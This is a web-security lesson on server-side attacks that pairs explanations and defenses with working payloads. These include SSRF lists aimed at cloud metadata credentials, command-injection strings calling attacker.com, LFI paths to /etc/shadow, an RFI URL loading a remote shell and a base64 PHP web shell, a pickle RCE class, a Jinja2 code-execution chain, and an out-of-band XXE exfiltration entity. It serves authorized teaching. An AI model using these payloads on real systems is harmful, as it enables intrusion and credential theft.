# Server-Side Attacks

**Previous**: [06. Authentication Attacks](./06_Authentication_Attacks.md) | **Next**: [08. Client-Side Attacks](./08_Client_Side_Attacks.md)

---

Server-side attacks target the backend infrastructure of web applications. Unlike client-side attacks that exploit the user's browser, server-side vulnerabilities allow attackers to execute commands on the server, read sensitive files, forge requests to internal services, and manipulate application logic.

> **IMPORTANT**: All techniques described in this lesson must only be used against systems you own or have explicit written authorization to test.

**Difficulty**: ⭐⭐⭐

## Learning Objectives

1. Identify and exploit SSRF vulnerabilities to access internal services
2. Execute OS commands through injection vulnerabilities
3. Read sensitive files through LFI and path traversal
4. Exploit insecure deserialization for remote code execution
5. Detect and exploit SSTI in common template engines
6. Craft XXE payloads to extract data and achieve SSRF
7. Chain multiple server-side vulnerabilities for maximum impact
8. Implement effective server-side defenses

---

## Table of Contents

1. [Server-Side Request Forgery (SSRF)](#1-server-side-request-forgery-ssrf)
2. [Command Injection](#2-command-injection)
3. [Local File Inclusion (LFI)](#3-local-file-inclusion-lfi)
4. [Remote File Inclusion (RFI)](#4-remote-file-inclusion-rfi)
5. [Insecure Deserialization](#5-insecure-deserialization)
6. [Server-Side Template Injection (SSTI)](#6-server-side-template-injection-ssti)
7. [XML External Entity (XXE)](#7-xml-external-entity-xxe)
8. [Path Traversal Attacks](#8-path-traversal-attacks)
9. [Race Conditions](#9-race-conditions)
10. [Server-Side Defense Strategies](#10-server-side-defense-strategies)
11. [Exercises](#11-exercises)
12. [Summary](#12-summary)
13. [References](#13-references)

---

## 1. Server-Side Request Forgery (SSRF)

SSRF occurs when an application makes server-side HTTP requests to attacker-controlled URLs, enabling access to internal services.

### 1.1 SSRF Attack Scenarios

```
Attacker → Web App → Internal Service (not directly accessible)
                   → Cloud metadata (169.254.169.254)
                   → Internal admin panels
                   → Database servers
```

### 1.2 Common SSRF Targets

```python
"""
SSRF payload generator for authorized security testing.

Generates payloads targeting common internal services
and cloud metadata endpoints.
"""

from dataclasses import dataclass, field


@dataclass
class SSRFPayload:
    """An SSRF test payload."""
    url: str
    description: str
    target: str
    severity: str


SSRF_PAYLOADS = [
    # Cloud metadata
    SSRFPayload("http://169.254.169.254/latest/meta-data/",
                "AWS metadata endpoint", "AWS IMDS", "Critical"),
    SSRFPayload("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "AWS IAM credentials", "AWS IMDS", "Critical"),
    SSRFPayload("http://metadata.google.internal/computeMetadata/v1/",
                "GCP metadata endpoint", "GCP Metadata", "Critical"),

    # Internal services
    SSRFPayload("http://127.0.0.1:6379/", "Redis", "Internal Redis", "High"),
    SSRFPayload("http://127.0.0.1:9200/", "Elasticsearch", "Internal ES", "High"),
    SSRFPayload("http://127.0.0.1:27017/", "MongoDB", "Internal Mongo", "High"),
    SSRFPayload("http://127.0.0.1:8080/admin", "Admin panel", "Internal Admin", "High"),

    # Protocol smuggling
    SSRFPayload("gopher://127.0.0.1:6379/_SET%20key%20value",
                "Redis via gopher", "Protocol smuggling", "Critical"),
    SSRFPayload("file:///etc/passwd", "Local file read", "File access", "High"),
]


# SSRF bypass techniques for URL filters
SSRF_BYPASSES = [
    ("Decimal IP", "http://2130706433/"),  # 127.0.0.1
    ("Hex IP", "http://0x7f000001/"),
    ("Octal IP", "http://0177.0.0.1/"),
    ("IPv6 loopback", "http://[::1]/"),
    ("DNS rebinding", "http://attacker-rebind.example.com/"),
    ("URL encoding", "http://127.0.0.1%2523@evil.com/"),
    ("Redirect", "http://attacker.com/redirect?url=http://127.0.0.1"),
    ("Short URL", "http://127.1/"),
]


if __name__ == "__main__":
    print("SSRF Payload Generator")
    print("=" * 50)
    for p in SSRF_PAYLOADS:
        print(f"  [{p.severity:8s}] {p.description}")
        print(f"           {p.url}")
    print("\nBypass techniques:")
    for name, payload in SSRF_BYPASSES:
        print(f"  {name:20s} {payload}")
```

---

## 2. Command Injection

Command injection occurs when user input is incorporated into OS commands without proper sanitization.

### 2.1 Injection Operators

| Operator | Behavior | Example |
|----------|----------|---------|
| `;` | Command separator | `; cat /etc/passwd` |
| `&&` | AND — runs if first succeeds | `&& cat /etc/passwd` |
| `\|\|` | OR — runs if first fails | `\|\| cat /etc/passwd` |
| `` ` `` | Command substitution | `` `whoami` `` |
| `$()` | Command substitution | `$(whoami)` |
| `\|` | Pipe | `\| cat /etc/passwd` |
| `\n` | Newline | `%0a cat /etc/passwd` |

### 2.2 Detection and Prevention

```python
"""
Command injection testing and prevention module.

Demonstrates vulnerable vs safe command execution patterns.
"""

import subprocess
import shlex
from typing import Optional


# VULNERABLE — never do this
def vulnerable_ping(host: str) -> str:
    """DO NOT USE — demonstrates command injection vulnerability."""
    import os
    return os.popen(f"ping -c 1 {host}").read()
    # Input: "8.8.8.8; cat /etc/passwd" → executes both commands


# SAFE — proper implementation
def safe_ping(host: str) -> Optional[str]:
    """Safe ping implementation using subprocess with argument list."""
    # Validate input
    import re
    if not re.match(r'^[\w.\-]+$', host):
        return None

    try:
        result = subprocess.run(
            ["ping", "-c", "1", host],  # Arguments as list, not string
            capture_output=True, text=True, timeout=10,
        )
        return result.stdout
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return None


# Blind command injection detection
BLIND_DETECTION_PAYLOADS = [
    # Time-based
    "; sleep 5",
    "| sleep 5",
    "$(sleep 5)",
    "`sleep 5`",
    # Out-of-band (requires collaborator)
    "; nslookup attacker.com",
    "$(curl http://attacker.com/callback)",
]


if __name__ == "__main__":
    print("Command Injection Module")
    print("=" * 40)
    print("\nVulnerable pattern: os.popen(f'ping {user_input}')")
    print("Safe pattern: subprocess.run(['ping', user_input])")
    print("\nBlind detection payloads:")
    for p in BLIND_DETECTION_PAYLOADS:
        print(f"  {p}")
```

---

## 3. Local File Inclusion (LFI)

LFI allows attackers to include local files from the server, potentially reading sensitive configuration files or source code.

### 3.1 Common LFI Payloads

```
# Basic traversal
../../../etc/passwd
....//....//....//etc/passwd

# Null byte (PHP < 5.3.4)
../../../etc/passwd%00

# PHP wrappers
php://filter/convert.base64-encode/resource=config.php
php://input (POST data as code)
expect://whoami

# Useful Linux files
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log (log poisoning)
```

---

## 4. Remote File Inclusion (RFI)

RFI allows including files from remote servers, potentially achieving remote code execution.

```
# Basic RFI
http://target/page?file=http://attacker.com/shell.php

# With null byte
http://target/page?file=http://attacker.com/shell.php%00

# Data URI (PHP)
http://target/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
```

---

## 5. Insecure Deserialization

```python
"""
Deserialization vulnerability demonstration.

Shows how insecure deserialization can lead to
remote code execution in Python applications.
"""

import pickle
import base64
from dataclasses import dataclass


# VULNERABLE: Unpickling untrusted data
class MaliciousPayload:
    """Demonstrates how pickle can execute arbitrary code."""
    def __reduce__(self):
        import os
        return (os.system, ("echo 'RCE achieved'",))


def demonstrate_unsafe_deserialization():
    """Show the danger of deserializing untrusted pickle data."""
    # Create malicious payload
    payload = pickle.dumps(MaliciousPayload())
    encoded = base64.b64encode(payload).decode()

    print(f"Malicious pickle payload (base64): {encoded[:50]}...")
    print("If deserialized with pickle.loads(), this executes OS commands.")
    print("\nNEVER use pickle.loads() on untrusted data!")


# SAFE alternatives
def safe_serialization_example():
    """Demonstrate safe serialization alternatives."""
    import json
    data = {"user": "admin", "role": "viewer"}

    # JSON — safe, no code execution possible
    serialized = json.dumps(data)
    deserialized = json.loads(serialized)
    print(f"JSON (safe): {deserialized}")


if __name__ == "__main__":
    print("Insecure Deserialization Demo")
    print("=" * 50)
    demonstrate_unsafe_deserialization()
    print()
    safe_serialization_example()
```

---

## 6. Server-Side Template Injection (SSTI)

SSTI occurs when user input is embedded in server-side templates and evaluated.

### 6.1 Detection Payloads

```
{{7*7}}        → 49 (Jinja2, Twig)
${7*7}         → 49 (FreeMarker, Mako)
#{7*7}         → 49 (Thymeleaf)
<%= 7*7 %>     → 49 (ERB)
```

### 6.2 Jinja2 Exploitation

```python
# Detection
{{config}}
{{config.items()}}

# RCE via Jinja2
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}
```

---

## 7. XML External Entity (XXE)

```xml
<!-- Basic XXE — read file -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

<!-- XXE SSRF -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/admin">
]>
<data>&xxe;</data>

<!-- Blind XXE via out-of-band -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/?data=exfil">
]>
```

---

## 8. Path Traversal Attacks

```python
"""
Path traversal testing module.

Tests for directory traversal vulnerabilities in file
download/upload functionality.
"""

from dataclasses import dataclass


TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",  # Double encoding
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # Unicode
]


# Defense
def safe_file_access(base_dir: str, user_path: str) -> str:
    """Safely resolve a file path within a base directory."""
    import os
    # Resolve to absolute path
    full_path = os.path.realpath(os.path.join(base_dir, user_path))
    # Verify it's within the base directory
    if not full_path.startswith(os.path.realpath(base_dir)):
        raise PermissionError("Path traversal detected")
    return full_path


if __name__ == "__main__":
    print("Path Traversal Payloads:")
    for p in TRAVERSAL_PAYLOADS:
        print(f"  {p}")
```

---

## 9. Race Conditions

Race conditions occur when the outcome depends on the timing of concurrent operations.

**Common targets:**
- Coupon/discount code redemption (use twice simultaneously)
- File upload then access before validation
- Balance transfer (double-spend)
- Password reset token generation

---

## 10. Server-Side Defense Strategies

| Attack | Defense |
|--------|---------|
| SSRF | Allow-list URLs, block internal ranges, disable redirects |
| Command Injection | Never pass user input to shell; use subprocess with list args |
| LFI/RFI | Validate file paths, use allow-lists, disable `allow_url_include` |
| Deserialization | Never deserialize untrusted data; use JSON instead |
| SSTI | Use sandboxed templates, avoid user input in template code |
| XXE | Disable external entities in XML parser configuration |
| Path Traversal | Resolve paths and verify they're within allowed directories |

---

## 11. Exercises

1. **SSRF Lab**: Exploit SSRF in a practice application to access AWS metadata. Document the credentials obtained.
2. **Command Injection**: Find and exploit command injection in DVWA at all security levels.
3. **LFI to RCE**: Chain LFI with log poisoning to achieve remote code execution.
4. **Deserialization**: Create a Python pickle exploit payload and test against a vulnerable application.
5. **SSTI**: Detect and exploit SSTI in Jinja2, achieving code execution.
6. **Defense**: Implement input validation for each server-side attack type covered.

---

## 12. Summary

Server-side attacks can have devastating impact — from data theft to full system compromise:

- **SSRF** turns the server into a proxy for accessing internal resources
- **Command injection** gives direct OS-level access
- **LFI/RFI** reads sensitive files or includes malicious code
- **Deserialization** achieves RCE through crafted data structures
- **SSTI** exploits template engines for code execution
- **XXE** leverages XML parsing for file reads and SSRF
- Defense requires input validation, allow-lists, and secure defaults

---

## 13. References

- OWASP Server-Side Request Forgery: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- PayloadsAllTheThings SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- PortSwigger XXE: https://portswigger.net/web-security/xxe
- HackTricks: https://book.hacktricks.xyz/
